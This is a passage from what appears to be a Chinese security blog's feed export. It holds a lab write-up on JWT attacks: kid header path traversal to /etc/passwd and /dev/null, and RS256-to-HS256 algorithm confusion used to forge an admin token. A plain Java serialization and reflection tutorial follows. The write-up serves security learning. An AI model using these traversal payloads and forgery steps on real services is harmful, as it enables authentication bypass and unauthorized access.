3、通过 kid 注入 JWT，与目录遍历攻击相结合在 JWT (JSON Web Token) 验证机制中，kid（Key ID）是 JWT 头部字段的一部分，通常用于指示服务器应使用哪个密钥来验证 JWT 的签名。然而，如果服务器处理 kid 时没有适当的输入验证，攻击者可以利用 kid 注入与目录遍历攻击相结合，绕过 JWT 的签名验证或滥用服务器的密钥管理逻辑，导致未授权访问或权限提升。
当 JWT 使用的是对称加密算法的时候，极有可能存在目录遍历的漏洞，我们能够强制服务器使用其文件系统中的任意文件作为验证密钥

攻击原理JWT 的头部示例：
&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;,  &quot;kid&quot;: &quot;../../etc/passwd&quot;&#125;


kid 的作用：

在 JWT 头部中，kid 参数用于指示服务器应使用哪个密钥（或密钥文件）来验证签名。例如，服务器从预定义的路径中加载 kid 对应的密钥（如 keys/&lt;kid&gt;.key）。
如果攻击者可以操控 kid 的值，并且服务器在读取密钥时存在文件路径拼接问题，攻击者就可以通过目录遍历访问到敏感文件。


目录遍历攻击：

如果服务器使用以下代码来加载密钥（没有过滤或处理路径输入）：
$kid = $_JWT[&#x27;header&#x27;][&#x27;kid&#x27;];$key = file_get_contents(&quot;/var/keys/&quot; . $kid . &quot;.key&quot;);

当攻击者将 kid 设置为 ../../etc/passwd 时，拼接后的路径变为 /var/keys/../../etc/passwd.key，经过目录遍历后，实际读取到的文件路径是 /etc/passwd。

这就导致服务器读取了不应访问的系统文件，并将该内容作为密钥进行 JWT 验证。



结合签名绕过：

在某些情况下，服务器会将文件的内容（如 /etc/passwd）当作 HMAC 的密钥来验证签名。攻击者可以提前生成一个以 /etc/passwd 内容作为密钥的 JWT 签名，并通过这种方式欺骗服务器完成签名验证，从而绕过认证。




攻击流程
攻击者生成一个 JWT，伪造头部中的 kid 字段为 ../../etc/passwd。
使用 /etc/passwd 内容作为 HMAC 密钥生成 JWT 签名。
将伪造的 JWT 发送给服务器。
服务器根据 kid 的值读取 /etc/passwd，并使用其内容验证签名。
签名验证通过，攻击者成功伪造 JWT，获得未授权的访问

题目接下来我们来看靶场中的一道题
要求：此实验室使用基于 JWT 的机制来处理会话。为了验证签名，服务器使用 JWT 标头中的 kid 参数从其文件系统中获取相关密钥。要解决实验问题，请伪造一个 JWT，让您能够访问 /admin 的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter
从获取到的JWT中我们可以看到该题使用的是对称密码加密

所以我们来到插件JWT Editor，生成一个 Symmetric Key，也就是对称密钥，并将 k 的值修改为AA==（base64编码的null字节）

接着我们去修改JWT，将kid的值修改为../../../../../dev/nullI（该文件默认为空文件）

修改完后，点击Sign，密钥要选择刚刚生成的对称密钥，以及选择第一个选项
将生成的JWT复制下来，拿去更改我们的session值，后访问&#x2F;admin，删去用户carlos，解决题目
JWT算法混淆1、对称加密与非对称加密可以使用一系列不同的算法对 JWT 进行签名。其中一些，如HS256（HMAC + SHA-256）使用“对称”密钥。这意味着服务器使用单个密钥对 Token 进行签名和验证。显然，这需要保密，就像密码一样。
其他算法，例如 RS256 (RSA + SHA-256) 使用“非对称”密钥对。它由服务器用来签署令牌的私钥和可用于验证签名的数学相关的公钥组成。
顾名思义，私钥必须保密，但公钥通常是共享的，以便任何人都可以验证服务器颁发的令牌的签名。
2、算法混淆漏洞产生的原因算法混乱漏洞通常是由于 JWT 库的实现有缺陷而引起的。尽管实际的验证过程因所使用的算法而异，但许多库提供了一种与算法无关的单一方法来验证签名。这些方法依赖于alg令牌标头中的参数来确定它们应执行的验证类型。
以下伪代码显示了此泛型verify()方法的声明在 JWT 库中的简化示例：
function verify(token, secretOrPublicKey)&#123;     algorithm = token.getAlgHeader();     if(algorithm == &quot;RS256&quot;)    &#123;         // Use the provided key as an RSA public key     &#125;else if (algorithm == &quot;HS256&quot;)    &#123;         // Use the provided key as an HMAC secret key         &#125; &#125;

当随后使用此方法的网站开发人员假设它将专门处理使用 RS256 等非对称算法签名的 JWT 时，就会出现问题。由于这个有缺陷的假设，他们可能总是将固定的公钥传递给该方法，如下所示：
publicKey = &lt;public-key-of-server&gt;; token = request.getCookie(&quot;session&quot;); verify(token, publicKey);

在这种情况下，如果服务器收到使用 HS256 等对称算法签名的令牌，则库的通用verify()方法会将公钥视为 HMAC 密钥。这意味着攻击者可以使用 HS256 和公钥对令牌进行签名，并且服务器将使用相同的公钥来验证签名。
上边是抄官方的话，下边我们用大白话来解释一下：

假设开发使用的是RS256这非对称加密算法生成的jwt。
由于信息泄露等原因攻击者可以拿到这个公钥，因为上边说过公钥通常是共享的
攻击者使用HS256算法伪造一个jwt，用这个公钥作为签名的密钥。

程序会使用verify()这个方法来验证jwt有没有被篡改。但是这个库设计的有问题（问题：他是通过你jwt头中alg来判断是使用那种算法来进行签名的。所以我们可以篡改他的算法），这块就会使用RS256生成的公钥作为HS256的秘钥来验证攻击者伪造的jwt。这个公钥攻击者可控，所以伪造的jwt就会通过验证。
3、执行算法混淆攻击的步骤
获取服务器的公钥
将公钥转换为合适的格式
创建一个恶意 JWT，其负载经过修改，alg标头设置为HS256.
使用公钥作为秘密，使用 HS256 对令牌进行签名。

4、通过算法混淆（泄露了密钥）绕过 JWT 身份验证来看看靶场中的题目
要求：此实验室使用基于 JWT 的机制来处理会话。它使用强大的 RSA 密钥对对令牌进行签名和验证。但是，由于实现缺陷，此机制容易受到算法混淆攻击。要解决该实验问题，请首先获取服务器的公钥。这是通过标准端点公开的。使用此密钥对修改后的会话令牌进行签名，该令牌允许您访问 /admin 的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter
提示：可以假设服务器将其公钥存储为 X.509 PEM 文件

服务器有时会通过映射到 /jwks.json 或 /.well-known/jwks.json 的标准端点将其公有密钥作为 JSON Web 密钥 （JWK） 对象公开。这些可以存储在称为 keys 的 JWK 数组中。这称为 JWK 集。
&#123;    &quot;keys&quot;: [        &#123;            &quot;kty&quot;: &quot;RSA&quot;,            &quot;e&quot;: &quot;AQAB&quot;,            &quot;kid&quot;: &quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;,            &quot;n&quot;: &quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot;        &#125;,        &#123;            &quot;kty&quot;: &quot;RSA&quot;,            &quot;e&quot;: &quot;AQAB&quot;,            &quot;kid&quot;: &quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;,            &quot;n&quot;: &quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot;        &#125;    ]&#125;

所以我们尝试访问&#x2F;jwks.json，获取到如下内容
&#123;&quot;keys&quot;:[&#123;&quot;kty&quot;:&quot;RSA&quot;,&quot;e&quot;:&quot;AQAB&quot;,&quot;use&quot;:&quot;sig&quot;,&quot;kid&quot;:&quot;1c5caebf-7b98-464a-a532-f29489724191&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;n&quot;:&quot;9cl7xLTPv-2lil8QK7FPE4yZR0evPLStVq9QgBHQyqQBsKBC1j6n3Av361kRrVyS3aZGycr0OzVdOgNNQalgHOevwgLEOY_t9BhTJdNe5x7hWiV4BKuI_RPupVTZetDHdtSBamY6fg5MHXbDQMF82dUYE_MJncIMWzUuz7UjIcGuf9fInDcaRZ8cvEEW_Q6em-xxIOTTHE1BK7fO_nNDHcggENAsR0CZCXLVzwZA8KvgPDYinhPDIZoN8AKL8kcJUhzJdERfT1TcQM7uajeItu55mHLE4V16lwzOxhXyLgAnBMPPjMUcXD_GCFilhT7fseceS8H__9EX7zEJgTT7lw&quot;&#125;]&#125;

​	将其中的jwt部分复制下来，转到bp的JWT Editor中新生成一个RSA密钥，将复制的内容粘贴进去，点击生成后，右键选中”Copy Public Key as PEM”，最后一行空行不要删掉
-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9cl7xLTPv+2lil8QK7FPE4yZR0evPLStVq9QgBHQyqQBsKBC1j6n3Av361kRrVyS3aZGycr0OzVdOgNNQalgHOevwgLEOY/t9BhTJdNe5x7hWiV4BKuI/RPupVTZetDHdtSBamY6fg5MHXbDQMF82dUYE/MJncIMWzUuz7UjIcGuf9fInDcaRZ8cvEEW/Q6em+xxIOTTHE1BK7fO/nNDHcggENAsR0CZCXLVzwZA8KvgPDYinhPDIZoN8AKL8kcJUhzJdERfT1TcQM7uajeItu55mHLE4V16lwzOxhXyLgAnBMPPjMUcXD/GCFilhT7fseceS8H//9EX7zEJgTT7lwIDAQAB-----END PUBLIC KEY-----

将该部分内容拿去base64编码后把便编码结果复制起来，如下
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5Y2w3eExUUHYrMmxpbDhRSzdGUApFNHlaUjBldlBMU3RWcTlRZ0JIUXlxUUJzS0JDMWo2bjNBdjM2MWtSclZ5UzNhWkd5Y3IwT3pWZE9nTk5RYWxnCkhPZXZ3Z0xFT1kvdDlCaFRKZE5lNXg3aFdpVjRCS3VJL1JQdXBWVFpldERIZHRTQmFtWTZmZzVNSFhiRFFNRjgKMmRVWUUvTUpuY0lNV3pVdXo3VWpJY0d1ZjlmSW5EY2FSWjhjdkVFVy9RNmVtK3h4SU9UVEhFMUJLN2ZPL25ORApIY2dnRU5Bc1IwQ1pDWExWendaQThLdmdQRFlpbmhQRElab044QUtMOGtjSlVoekpkRVJmVDFUY1FNN3VhamVJCnR1NTVtSExFNFYxNmx3ek94aFh5TGdBbkJNUFBqTVVjWEQvR0NGaWxoVDdmc2VjZVM4SC8vOUVYN3pFSmdUVDcKbHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==

生成一个对称加密的key，把k替换成我们刚修改完格式的公钥
接着去修改我们的jwt值，修改alg值，sub值，签名选择我们刚刚生成的对称密钥

将新生成的jwt拿去替换，成功访问&#x2F;admin，题目解决
5、通过算法混淆（不暴露密钥）绕过 JWT 身份验证https://forum.butian.net/share/2734
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Java序列化、反序列化以及反射</title>
    <url>/2024/10/18/Java%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[引用java序列化，看这篇就够了
大白话说Java反射：入门、使用、原理 - 陈树义 - 博客园
序列化的含义、意义及使用场景
序列化：将对象写入到IO流中
反序列化：从IO流中恢复对象
意义：序列化机制允许将实现序列化的Java对象转换位字节序列，这些字节序列可以保存在磁盘上，或通过网络传输，以达到以后恢复成原来的对象。序列化机制使得对象可以脱离程序的运行而独立存在。
使用场景：所有可在网络上传输的对象都必须是可序列化的，比如RMI（remote method invoke,即远程方法调用），传入的参数或返回的对象都是可序列化的，否则会出错；所有需要保存到磁盘的java对象都必须是可序列化的。通常建议：程序创建的每个JavaBean类都实现Serializeable接口。

序列化实现的方式如果需要将某个对象保存到磁盘上或者通过网络传输，那么这个类应该实现Serializable接口或者Externalizable接口之一。
Serializable普通序列化Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，该类的对象就是可序列化的；不实现此接口的类将不会使任何状态序列化或反序列化，会抛出 NotSerializableException

序列化步骤：


步骤一：创建一个ObjectOutputStream输出流；
步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象

import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.io.Serializable;// Person类，实现Serializable接口public class Person implements Serializable &#123;    private static final long serialVersionUID = 1L;  // 确保序列化版本一致    private String name;    private int age;    // 无参构造器未提供，必须通过此构造器创建对象    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;Person&#123;&quot; +               &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +               &quot;, age=&quot; + age +               &#x27;&#125;&#x27;;    &#125;    // 测试写入对象的主方法    public static void main(String[] args) &#123;        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;object.txt&quot;))) &#123;            // 将Person对象序列化并写入文件            Person person = new Person(&quot;John&quot;, 23);            oos.writeObject(person);            System.out.println(&quot;对象已成功序列化并写入文件。&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;


反序列化步骤：


步骤一：创建一个ObjectInputStream输入流；

步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。
我们将上面序列化到person.txt的person对象反序列化回来


import java.io.*;// Person类，实现Serializable接口public class Person implements Serializable &#123;    private static final long serialVersionUID = 1L;  // 确保序列化版本一致    private String name;    private int age;    // 无参构造器未提供，使用此构造器创建对象    public Person(String name, int age) &#123;        System.out.println(&quot;反序列化，你调用我了吗？&quot;);        this.name = name;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;Person&#123;&quot; +               &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +               &quot;, age=&quot; + age +               &#x27;&#125;&#x27;;    &#125;    // WriteObject类：将Person对象序列化到文件    public static class WriteObject &#123;        public static void main(String[] args) &#123;            try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;person.txt&quot;))) &#123;                Person person = new Person(&quot;John&quot;, 23);                oos.writeObject(person);                System.out.println(&quot;对象已成功序列化并写入文件。&quot;);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;    // ReadObject类：从文件反序列化Person对象    public static class ReadObject &#123;        public static void main(String[] args) &#123;            try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;person.txt&quot;))) &#123;                Person brady = (Person) ois.readObject();                System.out.println(brady);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;////输出结果//Person&#123;name=&#x27;John&#x27;, age=23&#125;

输出告诉我们，反序列化并不会调用构造方法。反序列的对象是由JVM自己生成的对象，不通过构造方法生成
成员是引用的序列化如果一个可序列化的类的成员不是基本类型，也不是String类型，那这个引用类型也必须是可序列化的；否则，会导致此类不能序列化。
看例子，我们新增一个Teacher类。将Person去掉实现Serializable接口代码。
import java.io.*;// Person类class Person &#123;	//省略    &#125;&#125;// Teacher类，实现Serializable接口public class Teacher implements Serializable &#123;    private static final long serialVersionUID = 1L;  // 序列化版本ID    private String name;    private Person person;    // 构造器    public Teacher(String name, Person person) &#123;        this.name = name;        this.person = person;    &#125;    @Override    public String toString() &#123;        return &quot;Teacher&#123;name=&#x27;&quot; + name + &quot;&#x27;, person=&quot; + person + &quot;&#125;&quot;;    &#125;    // 主方法：进行序列化    public static void main(String[] args) throws Exception &#123;        // 将Teacher对象序列化到teacher.txt文件        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;teacher.txt&quot;))) &#123;            Person person = new Person(&quot;路飞&quot;, 20);            Teacher teacher = new Teacher(&quot;雷利&quot;, person);            oos.writeObject(teacher);            System.out.println(&quot;对象已成功序列化并写入文件。&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        // 从teacher.txt文件反序列化Teacher对象        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;teacher.txt&quot;))) &#123;            Teacher deserializedTeacher = (Teacher) ois.readObject();            System.out.println(&quot;反序列化结果：&quot; + deserializedTeacher);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

上述代码会序列化失败，报错如下：
这是因为Person类的对象是不可序列化的，这导致了Teacher的对象不可序列化
同一对象序列化多次的机制同一对象序列化多次，会将这个对象序列化多次吗？答案是否定的。
public class WriteTeacher &#123;    public static void main(String[] args) throws Exception &#123;        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;teacher.txt&quot;))) &#123;            Person person = new Person(&quot;路飞&quot;, 20);            Teacher t1 = new Teacher(&quot;雷利&quot;, person);            Teacher t2 = new Teacher(&quot;红发香克斯&quot;, person);            //依次将4个对象写入输入流            oos.writeObject(t1);            oos.writeObject(t2);            oos.writeObject(person);            oos.writeObject(t2);        &#125;    &#125;&#125;

依次将t1、t2、person、t2对象序列化到文件teacher.txt文件中。
注意：反序列化的顺序与序列化时的顺序一致。
public class ReadTeacher &#123;    public static void main(String[] args) &#123;        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;teacher.txt&quot;))) &#123;            Teacher t1 = (Teacher) ois.readObject();            Teacher t2 = (Teacher) ois.readObject();            Person p = (Person) ois.readObject();            Teacher t3 = (Teacher) ois.readObject();            System.out.println(t1 == t2);            System.out.println(t1.getPerson() == p);            System.out.println(t2.getPerson() == p);            System.out.println(t2 == t3);            System.out.println(t1.getPerson() == t2.getPerson());        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;//输出结果//false//true//true//true//true

从输出结果可以看出，Java序列化同一对象，并不会将此对象序列化多次得到多个对象。

Java序列化算法


所有保存到磁盘的对象都有一个序列化编码号
当程序试图序列化一个对象时，会先检查此对象是否已经序列化过，只有此对象从未（在此虚拟机）被序列化过，才会将此对象序列化为字节序列输出。
如果此对象已经序列化过，则直接输出编号即可

下图表示上述序列化过程

可选的自定义序列化
有些时候，我们有这样的需求，某些属性不需要序列化。使用transient关键字选择不需要序列化的字段。（说明该属性是瞬态的）
public class Person implements Serializable &#123;   //不需要序列化名字与年龄   private transient String name;   private transient int age;   private int height;   private transient boolean singlehood;   public Person(String name, int age) &#123;       this.name = name;       this.age = age;   &#125;   //省略get,set方法&#125;public class TransientTest &#123;   public static void main(String[] args) throws Exception &#123;       try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;person.txt&quot;));            ObjectInputStream ios = new ObjectInputStream(new FileInputStream(&quot;person.txt&quot;))) &#123;           Person person = new Person(&quot;John&quot;, 23);           person.setHeight(185);           System.out.println(person);           oos.writeObject(person);           Person p1 = (Person)ios.readObject();           System.out.println(p1);       &#125;   &#125;&#125;//输出结果//Person&#123;name=&#x27;John&#x27;, age=23&#x27;, singlehood=true&#x27;, height=185cm&#125;//Person&#123;name=&#x27;null&#x27;, age=0&#x27;, singlehood=false&#x27;, height=185cm&#125;

从输出我们看到，使用transient修饰的属性，java序列化时，会忽略掉此字段，所以反序列化出的对象，被transient修饰的属性是默认值。对于引用类型，值是null；基本类型，值是0；boolean类型，值是false


使用transient虽然简单，但将此属性完全隔离在了序列化之外。java提供了可选的自定义序列化。可以进行控制序列化的方式，或者对序列化数据进行编码加密等。
private void writeObject(java.io.ObjectOutputStream out) throws IOException；private void readObject(java.io.ObjectIutputStream in) throws IOException,ClassNotFoundException;private void readObjectNoData() throws ObjectStreamException;

通过重写writeObject与readObject方法，可以自己选择哪些属性需要序列化， 哪些属性不需要。如果writeObject使用某种规则序列化，则相应的readObject需要相反的规则反序列化，以便能正确反序列化出对象。这里展示对名字进行反转加密。
public class Person implements Serializable &#123;   private String name;   private int age;   //省略构造方法，get及set方法   private void writeObject(ObjectOutputStream out) throws IOException &#123;       //将名字反转写入二进制流       out.writeObject(new StringBuffer(this.name).reverse());       out.writeInt(age);   &#125;   private void readObject(ObjectInputStream ins) throws IOException,ClassNotFoundException&#123;       //将读出的字符串反转恢复回来       this.name = ((StringBuffer)ins.readObject()).reverse().toString();       this.age = ins.readInt();   &#125;&#125;

当序列化流不完整时，readObjectNoData()方法可以用来正确地初始化反序列化的对象。例如，使用不同类接收反序列化对象，或者序列化流被篡改时，系统都会调用readObjectNoData()方法来初始化反序列化的对象。
可选的自定义序列化
使用transient虽然简单，但将此属性完全隔离在了序列化之外。java提供了可选的自定义序列化。可以进行控制序列化的方式，或者对序列化数据进行编码加密等。
rivate void writeObject(java.io.ObjectOutputStream out) throws IOException；private void readObject(java.io.ObjectIutputStream in) throws IOException,ClassNotFoundException;private void readObjectNoData() throws ObjectStreamException;

通过重写writeObject与readObject方法，可以自己选择哪些属性需要序列化， 哪些属性不需要。如果writeObject使用某种规则序列化，则相应的readObject需要相反的规则反序列化，以便能正确反序列化出对象。这里展示对名字进行反转加密。
public class Person implements Serializable &#123;   private String name;   private int age;   //省略构造方法，get及set方法   private void writeObject(ObjectOutputStream out) throws IOException &#123;       //将名字反转写入二进制流       out.writeObject(new StringBuffer(this.name).reverse());       out.writeInt(age);   &#125;   private void readObject(ObjectInputStream ins) throws IOException,ClassNotFoundException&#123;       //将读出的字符串反转恢复回来       this.name = ((StringBuffer)ins.readObject()).reverse().toString();       this.age = ins.readInt();   &#125;&#125;

当序列化流不完整时，readObjectNoData()方法可以用来正确地初始化反序列化的对象。例如，使用不同类接收反序列化对象，或者序列化流被篡改时，系统都会调用readObjectNoData()方法来初始化反序列化的对象。
更彻底的自定义序列化
ANY-ACCESS-MODIFIER Object writeReplace() throws ObjectStreamException;  ANY-ACCESS-MODIFIER Object readResolve() throws ObjectStreamException;

writeReplace：在序列化时，会先调用此方法，再调用writeObject方法。此方法可将任意对象代替目标序列化对象
java 代码解读复制代码public class Person implements Serializable &#123;  private String name;  private int age;  //省略构造方法，get及set方法  private Object writeReplace() throws ObjectStreamException &#123;      ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;(2);      list.add(this.name);      list.add(this.age);      return list;  &#125;   public static void main(String[] args) throws Exception &#123;      try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;person.txt&quot;));           ObjectInputStream ios = new ObjectInputStream(new FileInputStream(&quot;person.txt&quot;))) &#123;          Person person = new Person(&quot;John&quot;, 23);          oos.writeObject(person);          ArrayList list = (ArrayList)ios.readObject();          System.out.println(list);      &#125;  &#125;&#125;//输出结果//[John, 23]

readResolve：反序列化时替换反序列化出的对象，反序列化出来的对象被立即丢弃。此方法在readeObject后调用。
java 代码解读复制代码public class Person implements Serializable &#123;    private String name;    private int age;    //省略构造方法，get及set方法     private Object readResolve() throws ObjectStreamException&#123;        return new (&quot;brady&quot;, 23);    &#125;    public static void main(String[] args) throws Exception &#123;        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;person.txt&quot;));             ObjectInputStream ios = new ObjectInputStream(new FileInputStream(&quot;person.txt&quot;))) &#123;            Person person = new Person(&quot;John&quot;, 23);            oos.writeObject(person);            HashMap map = (HashMap)ios.readObject();            System.out.println(map);        &#125;    &#125;&#125;//输出结果//&#123;brady=23&#125;

readResolve常用来反序列单例类，保证单例类的唯一性。
注意：readResolve与writeReplace的访问修饰符可以是private、protected、public，如果父类重写了这两个方法，子类都需要根据自身需求重写，这显然不是一个好的设计。通常建议对于final修饰的类重写readResolve方法没有问题；否则，重写readResolve使用private修饰。


Externalizable：强制自定义序列化通过实现Externalizable接口，必须实现writeExternal、readExternal方法。
public interface Externalizable extends java.io.Serializable &#123;     void writeExternal(ObjectOutput out) throws IOException;     void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;&#125;public class ExPerson implements Externalizable &#123;    private String name;    private int age;    //注意，必须加上pulic 无参构造器    public ExPerson() &#123;    &#125;    public ExPerson(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    @Override    public void writeExternal(ObjectOutput out) throws IOException &#123;        //将name反转后写入二进制流        StringBuffer reverse = new StringBuffer(name).reverse();        System.out.println(reverse.toString());        out.writeObject(reverse);        out.writeInt(age);    &#125;    @Override    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123;        //将读取的字符串反转后赋值给name实例变量        this.name = ((StringBuffer) in.readObject()).reverse().toString();        System.out.println(name);        this.age = in.readInt();    &#125;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ExPerson.txt&quot;));             ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ExPerson.txt&quot;))) &#123;            oos.writeObject(new ExPerson(&quot;brady&quot;, 23));            ExPerson ep = (ExPerson) ois.readObject();            System.out.println(ep);        &#125;    &#125;&#125;//输出结果//ydarb//brady//ExPerson&#123;name=&#x27;brady&#x27;, age=23&#125;

注意：Externalizable接口不同于Serializable接口，实现此接口必须实现接口中的两个方法实现自定义序列化，这是强制性的；特别之处是必须提供pulic的无参构造器，因为在反序列化的时候需要反射创建对象。
在 Java 中，当你使用 ObjectOutputStream 和 ObjectInputStream 来序列化和反序列化实现了 Externalizable 接口的类时：

writeObject() 会自动调用对象的 writeExternal() 方法。
readObject() 会自动调用对象的 readExternal() 方法。

因此，即使我们在代码里没有显式调用 writeExternal() 和 readExternal()，它们会在序列化和反序列化过程中被 Java 底层自动触发
序列化版本号serialVersionUID我们知道，反序列化必须拥有class文件，但随着项目的升级，class文件也会升级，序列化怎么保证升级前后的兼容性呢？
java序列化提供了一个private static final long serialVersionUID 的序列化版本号，只有版本号相同，即使更改了序列化属性，对象也可以正确被反序列化回来。
serialVersionUID有两种显示的生成方式：

一是默认的1L，比如：private static final long serialVersionUID = 1L;
二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段，比如:private static final long serialVersionUID = xxxxL;

public class Person implements Serializable &#123;    //序列化版本号    private static final long serialVersionUID = 1111013L;    private String name;    private int age;    //省略构造方法及get,set&#125;

如果反序列化使用的class的版本号与序列化时使用的不一致，反序列化会报InvalidClassException异常

序列化版本号可自由指定，如果不指定，JVM会根据类信息自己计算一个版本号，这样随着class的升级，就无法正确反序列化；不指定版本号另一个明显隐患是，不利于jvm间的移植，可能class文件没有更改，但不同jvm可能计算的规则不一样，这样也会导致无法反序列化。
什么情况下需要修改serialVersionUID呢？分三种情况。

如果只是修改了方法，反序列化不容影响，则无需修改版本号；
如果只是修改了静态变量，瞬态变量（transient修饰的变量），反序列化不受影响，无需修改版本号；
如果修改了非瞬态变量，则可能导致反序列化失败。如果新类中实例变量的类型与序列化时类的类型不一致，则会反序列化失败，这时候需要更改serialVersionUID。如果只是新增了实例变量，则反序列化回来新增的是默认值；如果减少了实例变量，反序列化时会忽略掉减少的实例变量

反射基本使用了解反射之前我们先来了解一下什么是正射
一般情况下，我们使用某个类的时候必然知道它是什么类，用来干什么的，于是我们就可以直接对它进行实例化，然后使用其对象操作
Apple apple = new Apple(); //直接初始化，「正射」apple.setPrice(4);

像上面这样的就叫做正射
那么反射顾名思义就是我们并不知道要初始化的类对象是什么，也就无法使用new来创建新对象
这时候，就要用JDK提供的反射API进行反射调用：
Class clz = Class.forName(&quot;com.chenshuyi.reflect.Apple&quot;); //加载该类Method method = clz.getMethod(&quot;setPrice&quot;, int.class); //获取Apple类中的setPrice方法，该方法的参数是int类型Constructor constructor = clz.getConstructor(); //获取无参构造方法Object object = constructor.newInstance(); //创建实例method.invoke(object, 4); //调用方法

上面两段代码的执行结果，其实是完全一样的。但是其思路完全不一样，第一段代码在未运行时就已经确定了要运行的类（Apple），而第二段代码则是在运行时通过字符串值才得知要运行的类（com.chenshuyi.reflect.Apple）。
所以说什么是反射？
反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法
，一般情况下我们使用反射获取一个对象的步骤：

获取类的 Class 对象实例

Class clz = Class.forName(&quot;com.zhenai.api.Apple&quot;);


根据 Class 对象实例获取 Constructor 对象

Constructor appleConstructor = clz.getConstructor();


使用 Constructor 对象的 newInstance 方法获取反射类对象

Object appleObj = appleConstructor.newInstance();

而如果要调用某一个方法，则需要经过下面的步骤：

获取方法的 Method 对象

Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class);


利用 invoke 方法调用方法

setPriceMethod.invoke(appleObj, 14);

反射常用API获取反射的Class对象在 Java API 中，获取 Class 类对象有三种方法：
第一种，使用 Class.forName 静态方法。当你知道该类的全路径名时，你可以使用该方法获取 Class 类对象。
Class clz = Class.forName(&quot;java.lang.String&quot;);

第二种，使用 .class 方法。
这种方法只适合在编译前就知道操作的 Class。
Class clz = String.class;

第三种，使用类对象的 getClass() 方法。
String str = new String(&quot;Hello&quot;);Class clz = str.getClass();

通过反射创建类对象通常有以下两种方法
第一种：通过 Class 对象的 newInstance() 方法。
Class clz = Apple.class;Apple apple = (Apple)clz.newInstance();

第二种：通过 Constructor 对象的 newInstance() 方法
Class clz = Apple.class;Constructor constructor = clz.getConstructor();Apple apple = (Apple)constructor.newInstance();

通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。
Class clz = Apple.class;Constructor constructor = clz.getConstructor(String.class, int.class);Apple apple = (Apple)constructor.newInstance(&quot;红富士&quot;, 15);

通过反射获取类属性、方法、构造器我们通过 Class 对象的 getFields() 方法可以获取 Class 类的属性，但无法获取私有属性。
Class clz = Apple.class;Field[] fields = clz.getFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;

输出结果是：
price

而如果使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性：
Class clz = Apple.class;Field[] fields = clz.getDeclaredFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;

输出结果是：
nameprice

与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。
]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>KalmarCTF 2024 Web Challenges</title>
    <url>/2024/03/21/KalmarCTF-2024-Web-Challenges/</url>
    <content><![CDATA[Ez ⛳ v2按照题解中所讲下面这段代码比较重要
